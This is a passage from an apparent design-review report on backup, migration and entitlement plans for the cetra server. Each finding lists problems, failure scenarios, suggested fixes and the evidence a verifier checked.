**Problem.** The X15 fold adds a third command as one paragraph. There is no `AdminCommand::Migrate` variant, no `cetra_server::admin::migrate` signature (the CLI cannot call Storage::open, since it does not depend on cetra-storage), and no Edit-only entry for it. Its spec 09 row is in prose and missing from the replacement block. The Done-when counts remain 'both commands' and 'seven tests'. The paragraph says 'opens `meta.db` with `MetaDb::open` and the storage with `Storage::open`', in that order. Only Storage::open takes `LOCK`, so following the text migrates meta.db before the running-server check fires. Nothing requires meta.db and catalog.db to exist, so `migrate` on a wrong path quietly creates an empty instance. The existing CLI help text and the SourceSchema error still tell operators to start `cetra serve` before reapplying, the order X15 removes, and B8 does not ask to change them.

**Failure scenario.** On a systemd host the operator installs the new binary and runs `cetra admin migrate` before restarting. The old server is still running. MetaDb::open applies the new migrations under it, and only then does Storage::open return Locked. The running old binary now has a meta.db at a newer schema. Separately, a weak implementer adds no variant or server function and ticks 'seven tests', and the `migrate_while_the_server_runs_is_refused` test (same binary, so meta migrate is a no-op) cannot catch the ordering.

**Suggested fix.** In 08-cli.md, specify the full change. Add `AdminCommand::Migrate { config }`. Add `pub async fn migrate(config: &ServerConfig) -> Result<(), AdminError>` in crates/server/src/admin.rs, which first requires `meta.db` and `catalog.db` to exist (new `NotInitialized`/`NoCatalog` errors), then opens storage (LOCK; maintenance mode, see N-2), then MetaDb::open, then shuts down. Add the migrate row to the spec 09 block. Add a test that the server-running refusal happens before meta.db is touched, checking the schema version unchanged with an older meta.db fixture. Update the counts in Done when. Have B8 also change main.rs:132 and AdminError::SourceSchema's remedy to `cetra admin migrate`.

**Verifier evidence.** origin/claude/n-m2-backup-plan 08-cli.md lines 6-14 add `cetra admin migrate` as a single paragraph: 'opens `meta.db` with `MetaDb::open` and the storage with `Storage::open`'. It defines no AdminCommand variant, no server function signature and no Edit-only entry. The spec 09 replacement block (lines ~120-126) has no migrate row, and Done-when line 180 still reads 'Both commands exist with the seven tests'. MetaDb (crates/server/src/meta/mod.rs) takes no LOCK; only Storage::open does. If the implementer follows the stated order, meta.db is migrated before the Locked refusal. Nothing requires meta.db or catalog.db to exist first (gc_orphans has a NoCatalog guard, migrate has none). crates/cli/src/main.rs:132 ('run `cetra serve` once on a restored older backup first') and admin.rs:129-131 (SourceSchema: 'run `cetra serve` on a copy of it first') still prescribe the order X15 removes. This is related to X15 but is a defect in how its fix was folded in, not a restatement.

#### N-10 — Small cross-references between phase files a weaker model would trip on

- **Severity:** minor · **Verdict:** CONFIRMED · **Kind:** plan-defect · **Owner:** N
- **References:**
  - docs/plans/n-packaging/m2/06-backup.md § Done when ('the six tests'; § Tests lists eight)
  - docs/plans/n-packaging/m2/07-admin-socket.md lines 20 and 88 (`BackupRequest`, `backup::run(&state, BackupRequest { to, meta_only })`) vs 06-backup.md line 97 (`run(state, to: &Path, meta_only: bool)`, no BackupRequest type)
  - docs/plans/n-packaging/m2/05-orphans.md lines 132-133 ('adjust the variant to the actual type'), 143-146 (duplicated sentence)
  - docs/plans/n-packaging/m2/02-flush-now.md § Done when ('seven tests' matches; ok) vs 03-catalog-snapshot.md line 38 ('`catalog.db` is small') vs 00-design.md lines 153-155 ('on a large catalog flushes stall')

**Problem.** The phase files disagree on test counts, on a type B7 tells the implementer to read and call but B6 never defines, and on whether the catalog VACUUM INTO is short. B5 leaves the `OrphanError::Delete` source type to be guessed. Each is small, but these plans are written for a Haiku/GLM implementer who is told to follow the file exactly.

**Failure scenario.** The B7 implementer searches for `BackupRequest`, cannot find it, and invents a second request type next to `AdminRequest`. Or the B6 implementer stops after six tests, because Done-when says six.

**Suggested fix.** In B6, change 'six tests' to 'eight tests'. In B7, call `backup::run(&state, &to, meta_only)` and drop `BackupRequest`. In B5, name the error type (`ObjectError`, as `Objects::delete` returns it) and remove the duplicated sentence. Align B3's lock-order paragraph with the design's cost statement.

**Verifier evidence.** 06-backup.md § Tests lists 8 tests, but Done-when (line ~203) says 'the six tests'. 07-admin-socket.md:20 and :88 use `BackupRequest { to, meta_only }`, while 06-backup.md:97 defines `run(&AppState, to: &Path, meta_only: bool)` and no BackupRequest type. 05-orphans.md:132 says 'adjust the variant to the actual type', and lines 143-146 duplicate and garble the sentence. 03-catalog-snapshot.md:38 says '`catalog.db` is small', while 00-design.md:153-155 calls the stall 'a known cost' that grows on large catalogs.

#### N-3 — S3 mode, the only mode Q uses, has no test of meta-only backup → restore → gc-orphans

- **Severity:** minor (reviewer: major) · **Verdict:** CONFIRMED · **Kind:** plan-defect · **Owner:** N
- **References:**
  - docs/plans/n-packaging/m2/06-backup.md lines 191-192 ('S3 mode is covered by the storage tests (B3, B4) and by B8's manual check')
  - docs/plans/n-packaging/m2/00-design.md § How to verify (local `cetra serve` on a temp data dir only)
  - docs/plans/n-packaging/m2/05-orphans.md § Tests (all eight on the default local store)
  - docs/plans/n-packaging/m2/04-copy-objects.md copy_objects_refuses_a_remote_store (the only remote-store test, and it only checks the refusal)
  - claude/n-m2-impl:crates/storage/src/gc.rs (collect_orphans tests: no InMemory/open_with_store/CETRA_TEST_S3 use)
  - AGENTS.md § Tests (CETRA_TEST_S3_ENDPOINT, crates/storage/tests/s3.rs); tools/packaging/compose-smoke.sh s3 (Garage)

**Problem.** Q's cells run only in S3 mode and rely on meta-only backups and the `gc.grace` window (R9, R10, D-N-20). The plan never runs that path end to end: B6 defers it to B3/B4 and to 'B8's manual check', but B8's manual check is local-mode. No test lists a prefixed remote store in collect_orphans, which goes through `raw_store().list` on a PrefixStore. No test rolls a bucket back by deleting post-backup objects. No test checks that `missing` is 0 inside `gc.grace` and above 0 once an obsolete file has been collected. No test checks the MetaOnly manifest (`restorable_until`) from a server.

**Failure scenario.** A key-prefix or listing difference on a PrefixStore makes collect_orphans count every live object as unknown, or none. Or a meta-only restore within `gc.grace` reports missing files. Every local-mode test passes. The first restore drill on a Q cell, or a real incident, is the first time the path runs.

**Suggested fix.** Add a storage test on `open_with_store(InMemory)` with a prefix. It snapshots, shuts down, puts post-backup objects, reopens a fresh data dir on the copied catalog.db against the same store, runs collect_orphans, and asserts that the post-backup objects are deleted and `missing == 0`. A second case collects an obsolete file past grace before the restore and asserts `missing == 1`. Add an env-gated case to crates/storage/tests/s3.rs. Make the B8/B10 manual verification also run the S3 path, using `just compose-smoke … s3`'s Garage or `CETRA_TEST_S3_ENDPOINT`.

**Verifier evidence.** 06-backup.md:191-192 defers S3 coverage to 'the storage tests (B3, B4) and B8's manual check'. 00-design.md § How to verify (350-360) is local-mode only (temp data dir, release build). In claude/n-m2-impl, gc.rs has nine collect_orphans tests (lines 1022-1273), all on the default local store, with no InMemory, open_with_store or PrefixStore. tests/s3.rs has no orphan or snapshot case. Remote stores are wrapped in PrefixStore (objects.rs:619) and local ones are not (objects.rs:595), so collect_orphans's raw_store().list over `tables`/`media` never runs against a prefixed store in tests. The gap is real. The severity is lowered because PrefixStore listing is library behaviour and the risk is a missed regression, not a known defect.

#### N-5 — `--rollback-bucket` exists only in B8's clap struct: missing from the server function, D-N-21, spec 09 and the tests

- **Severity:** minor · **Verdict:** CONFIRMED · **Kind:** consistency · **Owner:** N
- **References:**
  - docs/plans/n-packaging/m2/08-cli.md lines 64-66 (flag), 98-102 (`gc_orphans(&config, min_age, dry_run)` but new `AdminError::RollbackNeedsConfirmation`), 114 ('returns the `OrphanReport`' vs `GcOrphansReport` at 110), spec 09 row (lines 134-136), tests (lines 141-165)
  - docs/plans/n-packaging/m2/00-design.md § Restore step 3 and D-N-21 (no confirmation flag)
  - docs/plans/n-packaging/m2/10-docs.md § Restore step 5 (plain `cetra admin gc-orphans`)

**Problem.** The S3 safety flag has no consistent definition. The server-side error that enforces it is placed in `admin.rs`, but the function signature cannot receive the flag. D-N-21, the design, the spec 09 row and B10's restore steps never mention it, and no test covers the refusal or the parsing. The same section says the function returns both `GcOrphansReport` and `OrphanReport`.

**Failure scenario.** An implementer keeps the given signature and puts the check in the CLI, or leaves it out. Nothing fails either way. Docs written from 10-docs.md tell S3 operators to run plain `gc-orphans`. That either fails with an error the docs never mention or, if the check was left out, rolls the live bucket back without confirmation.

**Suggested fix.** Make the signature `gc_orphans(config, min_age, dry_run, rollback_bucket)`, with the check in the server function before the storage is opened. Add `gc_orphans_in_s3_mode_needs_rollback_bucket` and a parse assertion. Name the flag in D-N-21, 00-design § Restore, the spec 09 row and 10-docs step 5. Return `GcOrphansReport` only.

**Verifier evidence.** In 08-cli.md (plan branch), the flag is on line 66 (`rollback_bucket: bool`). Line 98 has the signature `gc_orphans(&config, min_age, dry_run)`, which has no flag parameter, but lines 100-102 put RollbackNeedsConfirmation in that function. Line 110 names the return type GcOrphansReport and line 114 calls it 'the `OrphanReport`'. The tests (lines ~141-165) contain no refusal or parse test for the flag. D-N-21 and 00-design § Restore (grep 'rollback' finds only 'a rollback of the live bucket') do not name the flag, and neither do the spec 09 row or 10-docs step 5. The impl backup.md does mention `--rollback-bucket`, so the plan record is inconsistent with what was written.

#### N-6 — N's own Requests-for-Q note still names `storage.gc.object_retention` (stale against D-N-20)

- **Severity:** minor · **Verdict:** CONFIRMED · **Kind:** consistency · **Owner:** N
- **References:**
  - docs/plans/n-packaging/README.md § Requests for Q item 4, lines 483-488
  - docs/mvp-decisions.md D-N-20 (line 561)
  - docs/plans/n-packaging/m2/00-design.md § S3 object retention (line 236)

**Problem.** This adds one source document to X1. The M1 README, which is N's published contract for Q, still says R10 is `storage.gc.object_retention`, 'which Q sets to `8d`'. N's M2 rejects that key and spec 12 treats unknown keys as errors. X1's references cover the M2 design, the decisions and spec 12, but not this README, which is the most likely source of Q's wrong key. Neither plan branch updates it.

**Failure scenario.** Q's authors, or the coordinator fixing X1, re-read N's README § Requests for Q and keep `object_retention = "8d"`. The cell config then fails at startup with an unknown key.

**Suggested fix.** In README § Requests for Q item 4: R10 is answered by D-N-20 with `storage.gc.grace = "8d"` (max 30d), and R9 by `cetra admin backup` through the control socket (D-N-17). Also point § After M1 at the R9/R10 mapping.

**Verifier evidence.** docs/plans/n-packaging/README.md lines 484-488, on both main and the plan branch, still read 'R10, `storage.gc.object_retention`, which Q sets to `8d`'. D-N-20 rejects that key. The X1 references list the M2 design, mvp-decisions and spec 12 but not this README. This is related to X1 (same root cause) and adds a stale N-side source that X1's fix would miss.

#### N-7 — The plan's X14/X15 folds skipped 09 and 10, so the phase texts contradict D-N-22, the restore order and the impl branch

- **Severity:** minor · **Verdict:** CONFIRMED · **Kind:** consistency · **Owner:** N
- **References:**
  - origin/claude/n-m2-backup-plan:docs/plans/n-packaging/m2/09-pre-migration.md lines 65-70 (spec 12 sentence still `meta.db.pre-<version>`)
  - origin/claude/n-m2-backup-plan:docs/plans/n-packaging/m2/10-docs.md lines 55-68 (Restore: 6 start, 7 reapply; no `admin migrate`), 73-75 (upgrade.md `pre-<version>`), 97 (cites D-N-17–D-N-21)
  - main:docs/mvp-decisions.md D-N-22 line 563 and main:docs/plans/n-packaging/m2/00-design.md (still `pre-<version>`; ec212e4 is not on main)
  - claude/n-m2-impl:docs/self-hosting/backup.md § Restore and upgrade.md (implemented with the corrected text, unlike the plan)

**Problem.** ec212e4 folds X14 (`pre-m<applied>`) and X15 (reapply before the first start, `admin migrate`) into 00-design and 08-cli only. 09-pre-migration.md still tells the implementer to write `pre-<version>` into spec 12. 10-docs.md still prescribes 'Start the server' before `reapply-deletions` and the `pre-<version>` wording in upgrade.md. The implementation branch silently did the right thing, so the plan record and the code now disagree. Main has neither fold, because the plan branch is not merged.

**Failure scenario.** An implementer redoes B9/B10, or a reviewer checks the delivery against 10-docs.md. They restore the 'start then reapply' order X15 removed, or flag the corrected docs as a deviation. Readers of main see D-N-22 with the package-version name.

**Suggested fix.** Update 09-pre-migration.md § spec 12 sentence and 10-docs.md (§ Restore steps: gc-orphans, `admin migrate` if older, `reapply-deletions`, then start; `pre-m<N>` in upgrade.md; cite D-N-17–D-N-24), then merge origin/claude/n-m2-backup-plan to main.

**Verifier evidence.** ec212e4 (on origin/claude/n-m2-backup-plan, not on HEAD or main) updates 00-design (D-N-22 `pre-m<applied>`, restore step 4 `admin migrate`) and 08-cli. The same branch's 09-pre-migration.md lines 66-69 still give the spec 12 sentence with `meta.db.pre-<version>`. Its 10-docs.md § Restore still has '6. Start the server. 7. Run reapply-deletions' and no migrate step, and its upgrade.md text still says `pre-<version>`. The impl backup.md § Restore uses the corrected order (gc-orphans, migrate, reapply, then start), and commit 075712c keys copies by schema. The plan record and the implementation therefore disagree.

#### N-8 — Restore and online backup have no container procedure: no way to run admin commands with the server stopped, and no chart value for a backup volume

- **Severity:** minor · **Verdict:** CONFIRMED · **Kind:** plan-defect · **Owner:** N
- **References:**
  - docs/plans/n-packaging/m2/10-docs.md § Restore (lines 55-68: bare `cetra admin …` commands) and § Online backup ('B10 does not change `deploy/`')
  - claude/n-m2-impl:docs/self-hosting/backup.md § Restore steps 3-7 (no compose or Kubernetes commands) and § Kubernetes ('The Helm chart has no value for a second volume yet … post-renderer')
  - deploy/helm/cetra/values.yaml and templates/statefulset.yaml lines 139-151 (only the data and config volumes)

**Problem.** The restore steps (copying into the data volume, `gc-orphans`, `admin migrate`, `reapply-deletions`) must run with cetra stopped, from the image, with the server's env and config. For compose that means `docker compose run --rm --no-deps cetra admin …` and a helper container to fill the named volume. For Kubernetes the StatefulSet is scaled to 0, so there is no pod to exec into, and a one-off pod has to mount the PVC with the same env, Secret and ConfigMap. Neither the plan nor the implemented docs say any of this, although the cold-backup section does give per-install commands. The online backup on Kubernetes also needs a hand-maintained post-renderer, because the chart has no extraVolumes/extraVolumeMounts.

**Failure scenario.** A compose or Kubernetes operator follows § Restore and types `cetra admin gc-orphans` on the host. The command either does not exist there or reads a different data directory and config, or it is run through `docker compose exec`, which fails because the service is stopped. The restore stalls in an incident, or the operator starts the server to get a shell, which is exactly the start-before-reapply X15 forbids.

**Suggested fix.** In 10-docs.md, require per-install restore commands. For compose: `docker compose run --rm --no-deps cetra admin gc-orphans --dry-run`, and so on, plus a busybox step to fill the volume. For Kubernetes: a documented one-off pod (or `kubectl debug`) that mounts `data-cetra-0` with the chart's env, Secret and ConfigMap. Either add `extraVolumes`/`extraVolumeMounts` to the chart in a small N change, or record the post-renderer limitation as a decision.

**Verifier evidence.** The impl backup.md § Restore steps 3-7 give bare `cetra admin gc-orphans` / `admin migrate` / `reapply-deletions` commands with only 'Use the server's configuration'. They include no `docker compose run --rm --no-deps` form and no Kubernetes one-off pod, while the server is stopped (scaled to 0 on k8s, so there is nothing to exec into). The Kubernetes online-backup section (lines 111-115) admits that a post-renderer or chart copy is needed for a backup volume. deploy/helm statefulset.yaml mounts only data and config, with no extraVolumes. X2 covers Q's runbook, not N's docs, so this is not a duplicate.

#### N-9 — The impl branch ran B10 before B8: roadmap and changelog claim commands that do not exist yet

- **Severity:** minor · **Verdict:** CONFIRMED · **Kind:** delivery-gap · **Owner:** N
- **References:**
  - docs/plans/n-packaging/m2/00-design.md § Phases (B10 needs B1–B9; B6, B7, B8 in order, B10 last)
  - claude/n-m2-impl:docs/roadmap.md row N ('M2 (online backups, `gc-orphans`, pre-migration copies) implemented.')
  - claude/n-m2-impl:CHANGELOG.md [Unreleased] (lists `cetra admin backup`, `gc-orphans`, `admin migrate`)
  - claude/n-m2-impl:crates/cli/src/main.rs (no Backup, GcOrphans or Migrate command); claude/n-m2-b8 has the same tip as n-m2-impl

**Problem.** On claude/n-m2-impl, 'Document online backups' (B10) landed and the eventual B8 branch is identical to it. The roadmap row says M2 is implemented, and the changelog, spec 12 and self-hosting docs describe `cetra admin backup`, `gc-orphans`, `--rollback-bucket` and `admin migrate`, but the CLI has none of them. Only the server side (socket, backup::run) exists.

**Failure scenario.** The branch is merged as is, for example to unblock Q's R9 check (`admin backup --help`). Main then documents and announces commands that fail with 'unrecognized subcommand', and the roadmap marks track N's M2 done with B8 and its manual end-to-end verification never run.

**Suggested fix.** Do B8 on the branch before it merges, then run the 00-design § How to verify sequence. Until then, keep the roadmap cell at 'B1–B7, B9 done; B8 pending' and hold the changelog and docs lines that name the CLI commands.

**Verifier evidence.** claude/n-m2-b8 and claude/n-m2-impl both point at 5b35a3e. claude/n-m2-impl crates/cli/src/main.rs has no Backup, GcOrphans or Migrate command (grep finds only the old reapply-deletions help at line 131-132). Its roadmap row N says 'M2 (online backups, `gc-orphans`, pre-migration copies) implemented.' Its CHANGELOG lines 15-18 announce `cetra admin backup`, `gc-orphans` and `admin migrate`. 'Document online backups' (95f91d2) landed before any B8 commit. This is a branch state, not yet merged.

### Track P — plans and entitlements

#### P-1 — D-P-44's 'one QueryOptions constructor' test is bypassed by QueryOptions::default()

- **Severity:** major · **Verdict:** CONFIRMED · **Kind:** plan-defect · **Owner:** P
- **References:**
  - crates/storage/src/lib.rs:219-227 (#[derive(Debug, Clone, Copy, Default)] pub struct QueryOptions { pub around })
  - origin/claude/p-xtrack-fixes docs/plans/p-entitlements/00-design.md:67 (D-P-21: 'A test fails if `QueryOptions {` appears in crates/server/src outside query_options')
  - 00-design.md:114 D-P-44; mvp-decisions.md D-P-44 ('tests forbid any other construction')

**Problem.** The invariant behind the paywall and data window is enforced by a text test that looks only for the literal `QueryOptions {`. QueryOptions derives Default and its fields are public. After M4 adds `visible_from: Option<i64>`, `storage.query(project, QueryOptions::default())`, or `QueryOptions { ..Default::default() }` written through a helper, builds options with `visible_from: None` and does not match the forbidden literal. mvp-decisions says the tests forbid 'any other construction', but the design only specifies the literal grep.

**Failure scenario.** An implementer adds a direct read in a new I/K/M worker, or migrates an existing one, as `state.storage.query(project, QueryOptions::default())` to keep QueryError classification. The test passes. That read path ignores the org's data_access_days, so a Free org's evaluator, alert or export reads data from before its 30-day window. This is the leak D-P-21 exists to prevent.

**Suggested fix.** In M4, make the type impossible to build except through one constructor. In crates/storage: drop `Default` from QueryOptions, make its fields private, and add `QueryOptions::new(around: Option<i64>, visible_from: Option<i64>)`. The server test then forbids `QueryOptions::new(` and `QueryOptions {` outside `entitlements::query_options`. Alternatively, keep the type and make the test also reject `QueryOptions::default` and `Default::default()` near `.query(`. Record the chosen mechanism in D-P-44.

**Verifier evidence.** crates/storage/src/lib.rs:219-226 has #[derive(Debug, Clone, Copy, Default)] pub struct QueryOptions with pub field `around`. PR #92's 00-design.md:67 (D-P-21) and :114 (D-P-44) specify only the test 'forbid a literal `QueryOptions {` outside query_options'. `QueryOptions::default()` is already the usual shorthand in crates/server/src (ingest/grpc.rs:247, ingest/mod.rs:623,909, routes/otlp.rs:269,288 in tests), so an implementer would naturally reach for it and the grep would not catch it. X7's fix proposed the same literal-only test, so this hole is new, not a restatement of X7. The M4 plan is not written (no 04-m4 file on any branch), so the mechanism is still open to fix.

#### P-2 — Deletion exemption still has pre-D-P-44 wording, and misses the filter-deletion read in routes/deletions.rs

- **Severity:** minor · **Verdict:** CONFIRMED · **Kind:** plan-defect · **Owner:** P
- **References:**
  - origin/claude/p-xtrack-fixes docs/plans/p-entitlements/00-design.md:67 (D-P-21: 'a test lists the only callers allowed to pass `None` with an org window in force (`deletion::resolve` and the preview handler)' and 'Visibility::Exempt appears outside the deletion modules')
  - crates/server/src/routes/deletions.rs:337 (create_deletion Filter branch calls matching → read::open_query to enforce the 100k cap)
  - crates/server/src/routes/deletions.rs:433,463-470 (preview and matching)
  - crates/server/src/deletion/resolve.rs:32

**Problem.** After D-P-44, D-P-21 says two different things:
- the old sentence about callers passing `None`, a mechanism D-P-44 removes;
- a test that bans `Visibility::Exempt` outside 'the deletion modules', which it never defines.
The scope reads are not only in `crate::deletion`. The filter-deletion create handler (routes/deletions.rs:337) and the preview both go through `routes::deletions::matching`, which D-P-21 names only as 'the preview handler'.

**Failure scenario.** A weak implementer takes 'deletion modules' to mean crate::deletion. Either the Exempt test fails on routes/deletions.rs, or they give `matching` the org window. With the window, the create-time count leaves out hidden traces, so a filter erasure over 100,000 traces passes the D-M-5 cap check. The worker then resolves more traces than the cap allows, and the preview under-reports what will be erased.

**Suggested fix.** In D-P-21, delete the stale 'pass `None`' sentence. List the exact files allowed to use Visibility::Exempt: deletion/resolve.rs, deletion/mod.rs (worker reads) and routes/deletions.rs (`matching`, used by create and preview). Add a test that a filter-deletion create and a preview count a trace older than the window.

**Verifier evidence.** PR #92 00-design.md:67 D-P-21 still has 'a test lists the only callers allowed to pass `None` with an org window in force (`deletion::resolve` and the preview handler)', next to the new 'Visibility::Exempt appears outside the deletion modules'. 'Deletion modules' is never defined. routes/deletions.rs:337 (create_deletion) and :433 (preview_deletion) both call `matching` (:463), which uses read::open_query (:468). The hook row :198 names only 'scope reads and the deletion preview', not the filter create path.

#### P-3 — PR #92 adds D-P-44–46 but leaves the decisions they amend unmarked, and the registry is stale

- **Severity:** minor · **Verdict:** CONFIRMED · **Kind:** consistency · **Owner:** P
- **References:**
  - origin/claude/p-xtrack-fixes docs/mvp-decisions.md:512 D-P-21 ('only routes/read.rs::open_query_on builds QueryOptions'), :513 D-P-22 ('passed to track M's retention'), :482 D-M-15 ('the cap is the plan's data-access window + 30 days')
  - mvp-decisions.md:437 D-I-34 (`entitlements::query_options(&state, org, around)`) vs D-P-44 `query_options(visibility, around)`
  - 00-design.md:196 hook row ('I's D-I-34 names this function')
  - origin/claude/p-xtrack-fixes docs/roadmap.md P row Decision IDs '`D-P-1`–`D-P-43`'

**Problem.** D-M-7 was marked 'Amended by D-P-46', but D-P-21, D-P-22 and D-M-15 in mvp-decisions still state the replaced contracts: open_query_on as the only builder, and retention_cap_days (current window + 30) for M's retention. D-I-34 names a three-argument `query_options(&state, org, around)`. D-P-44 chose `(visibility, around)`, yet P's hook row says D-I-34 already names the function. The roadmap P row still lists `D-P-1`–`D-P-43`.

**Failure scenario.** I's or M's M4-era implementer reads mvp-decisions, the registry the AGENTS.md rules point to, and wires retention to `of(org).retention_cap_days()`. This is X8's bug coming back through D-M-15 and D-P-22. Or they call a `query_options(&state, org, around)` that does not exist.

**Suggested fix.** Add 'Amended by D-P-44' to D-P-21, and 'Amended by D-P-45' to D-P-22 and D-M-15 in mvp-decisions. Update D-I-34's signature, or say plainly in the hook row that D-I-34 must change. Set the roadmap P row to `D-P-1`–`D-P-46`.

**Verifier evidence.** In PR #92's mvp-decisions.md, D-M-7 (:474) carries 'Amended by D-P-46', but D-P-21 (:512) still says 'only routes/read.rs::open_query_on builds QueryOptions', D-P-22 (:513) still says 'passed to track M's retention (D-M-15)', and D-M-15 (:482) still says 'cap is the plan's data-access window + 30 days'. None of them is marked amended. D-I-34 (:437) names `entitlements::query_options(&state, org, around)`, while D-P-44 is `(visibility, around)`, and hook row :196 claims 'I's D-I-34 names this function'. The roadmap P row still lists `D-P-1`–`D-P-43`. X32 and X34 cover other stale registry entries, not these.

#### P-4 — D-P-45/D-P-22 hook rows cannot be executed as written (retention error isolation, ingest builder)

- **Severity:** minor · **Verdict:** CONFIRMED · **Kind:** plan-defect · **Owner:** P
- **References:**
  - origin/claude/p-xtrack-fixes docs/plans/p-entitlements/00-design.md:191 (`retention_window_at(&state.meta, org_id, now).await?` in retention_once)
  - crates/server/src/retention.rs:47-85 (per-project loop; only the listing returns MetaError; 'A storage error on one project is logged and counted; the others still run')
  - 00-design.md:68 D-P-22 ('ingest/mod.rs, both IngestContext builders') and :197
  - crates/server/src/ingest/mod.rs:182-189 (`Ingest::context`, no AppState), :303 (accept), :568 (test helper `expected`); crates/server/src/eval/test_run.rs:210

**Problem.** (a) The replacement code puts `.await?` on a meta.db read inside retention_once's per-project loop. One org's read error would then abort the whole hourly run for every remaining project, against the function's documented isolation, and the read repeats for every project of an org. (b) D-P-22 says to change 'both IngestContext builders' in ingest/mod.rs. On main there is one non-test builder, `Ingest::context`, used by accept and by I's eval/test_run.rs; the other is the test helper `expected`. `Ingest` has no AppState, so the cap must be threaded through `Ingest::accept`'s signature from the HTTP and gRPC handlers. The design does not say so.

**Failure scenario.** A transient meta.db read failure for one org skips retention for every later project that hour; it repeats if the error persists. A Haiku/GLM implementer of the D85 bound edits the test helper, or looks for an AppState that `Ingest` does not have, and has to guess a signature change across ingest, grpc, otlp and I's call sites.

**Suggested fix.** In the hook row: compute the cap once per org. On error, log the org id, count a failure and skip that org's projects (skipping deletion is the safe side). For the D85 bound: give `Ingest::context` and `Ingest::accept` a `retention_cap: Option<u32>` parameter supplied by routes/otlp.rs and ingest/grpc.rs from `of(state, org).retention_cap_days()`. Name each call site, including eval/test_run.rs, which passes `None`.

**Verifier evidence.** (a) crates/server/src/retention.rs:47-85: retention_once loops over projects_for_retention rows (org, project, own). Only the listing returns MetaError, and the docs say other projects still run when one fails. PR #92 hook row :191 puts `retention_window_at(...).await?` in that loop, so one org's read error aborts the whole run, and the meta read is repeated for every project. (b) ingest/mod.rs:42-49: `Ingest` holds no AppState. The only non-test builder is `Ingest::context` (:182-189), called from accept (:303) and eval/test_run.rs:210. The second literal is the test helper `expected` (:561-571). D-P-22's 'both IngestContext builders' gives no plan for threading the cap through accept from routes/otlp.rs:76 and grpc.

#### P-5 — With D-P-46, a re-created org id inherits the dropped org's kept usage, and its own rows are later pruned

- **Severity:** minor · **Verdict:** PLAUSIBLE · **Kind:** plan-defect · **Owner:** P
- **References:**
  - origin/claude/p-xtrack-fixes docs/plans/p-entitlements/00-design.md:116 D-P-46 (pruner keyed on org_id with an applied org deletion ≥ 40 days old)
  - 00-design.md:87 D-P-29 (internal create takes the control plane's UUIDv7; same id answers 200)
  - crates/server/src/routes/internal_orgs.rs:60-105 (returns `Existing` for any org row, any state; inserts when the row is absent)
  - crates/server/migrations/meta/0002_usage.sql (usage_daily keyed by org_id, no FK)

**Problem.** After an org drop, the `orgs` row is deleted, but under D-P-46 its usage_daily rows stay for 40 days. `POST /api/internal/v1/orgs` with that id, from a delayed or retried create in Q (R17 makes control-plane deletes routine), creates a new org with the same id. Nothing refuses an id that has a `deletions` row of kind org. Also, during the drop, the same POST answers 200 with an org in state `deleting`.

**Failure scenario.** Q creates org X, deletes it through R17, and a stale create retry for X then lands. The new X starts its month with the dropped org's units, so the Free cap (402) or the 80 %/100 % notices fire wrongly, and the usage export bills them twice. Forty days after the old drop, the D-P-46 pruner deletes all of X's usage_daily rows, the new org's included.

**Suggested fix.** In M4 (with R17), have the internal create refuse an id that has a `deletions` row of kind org (409 conflict, or 410), and answer 409 for an org in state `deleting` instead of 200. Add both cases to internal_orgs tests and to § Interfaces for track Q.

**Verifier evidence.** crates/server/src/routes/internal_orgs.rs:65-67 returns Outcome::Existing (200) for any existing org row, whatever its state (including 'deleting'). When the row is absent, it inserts with the given id and never checks `deletions` for an org-kind row. usage_daily (0002_usage.sql) is keyed by org_id with no FK, and D-P-46 keeps those rows for 40 days and later prunes them by org_id. The mechanism is real. The trigger needs Q to replay a create for an id it has already deleted, and that depends on Q's retry behaviour, which I could not check.

#### P-6 — R17 (control-plane org delete) has no actor in M's deletion model, and the hook table has no row for it

- **Severity:** minor · **Verdict:** CONFIRMED · **Kind:** plan-defect · **Owner:** P
- **References:**
  - origin/claude/p-xtrack-fixes docs/plans/p-entitlements/00-design.md:233 (§ Interfaces for track Q item 5: `DELETE /api/internal/v1/orgs/{org_id}` starts track M's org drop)
  - 00-design.md:189-200 (§ Interfaces for M, K and I: no R17 row)
  - crates/server/src/api/deletions.rs:55-60 (`DeletionActorKind { User, ApiKey }`, public API type)
  - crates/server/src/meta/deletions.rs:98 (`ActorKind`); migrations/meta/0007_deletions.sql (`requested_by_kind`, `requested_by` NOT NULL)
  - mvp-decisions.md D-M-7 (drop confirmed by `?confirm=<slug>`)

**Problem.** M's deletion rows need a requester kind and id, and the public `Deletion` type only knows `user` and `api_key`. A drop started by the control plane fits neither. The design does not say which kind and id it records, whether the slug confirmation applies, or that the public enum, OpenAPI, fixtures and the UI's history/Data tab must change. M4's plan is not written, and the design is its only source.

**Failure scenario.** The M4 implementer records the drop as `User` with a nil or made-up UUID (a misleading audit trail in the org's deletion history), or adds a `control_plane` kind only in meta. The `Deletion` API type then fails to decode stored rows (`corrupt("requested_by_kind")`), and the history page breaks.

**Suggested fix.** Add a hook-table row for M's deletion model: a `control_plane` ActorKind/DeletionActorKind, with `requested_by` set to the control_plane token id. The internal delete skips `?confirm=`. Include the API enum, OpenAPI, fixtures/api and UI label changes, and the shape of the R5 feed's page (spec 09 cursor).

**Verifier evidence.** crates/server/src/api/deletions.rs:53-60: the public DeletionActorKind has only User and ApiKey. 0007_deletions.sql has `requested_by_kind` and `requested_by` NOT NULL. PR #92 00-design.md:233 (item 5) only says the DELETE 'starts track M's org drop'. Neither the hook table (:189-200) nor any other text says which actor is recorded or whether `?confirm=` applies. No 04-m4 plan exists on any branch.

#### P-7 — M3 plan omits D-P-32's promise to add the month's usage to `cetra admin entitlements show`

- **Severity:** minor · **Verdict:** CONFIRMED · **Kind:** delivery-gap · **Owner:** P
- **References:**
  - docs/plans/p-entitlements/00-design.md:90 D-P-32 ('M3 adds the month's usage to both')
  - docs/plans/p-entitlements/03-m3-units-and-limits.md § P5 (changes only the entitlements API response)
  - crates/server/src/admin.rs:58-60 EntitlementsReport (no usage field)
  - origin/claude/p-m3-impl: no change to crates/cli or crates/server/src/admin.rs

**Problem.** D-P-32 says M3 adds the month's usage both to the entitlements response and to `cetra admin entitlements show`. M3's plan only covers the API, and PR #90 leaves EntitlementsReport and the CLI unchanged. This narrows a decision without recording it, and PR #90's close-out does not mention it.

**Failure scenario.** An operator debugging a 402 on a cell runs `cetra admin entitlements show <org>` expecting the month's units against the cap, as D-P-32 promised. The command shows only plan and limits, and nothing records that the item was dropped.

**Suggested fix.** Either add `month_units` (from usage_daily, read offline) to EntitlementsReport and the CLI table in M3/PR #90 with a test, or amend D-P-32 to say only the API carries usage.

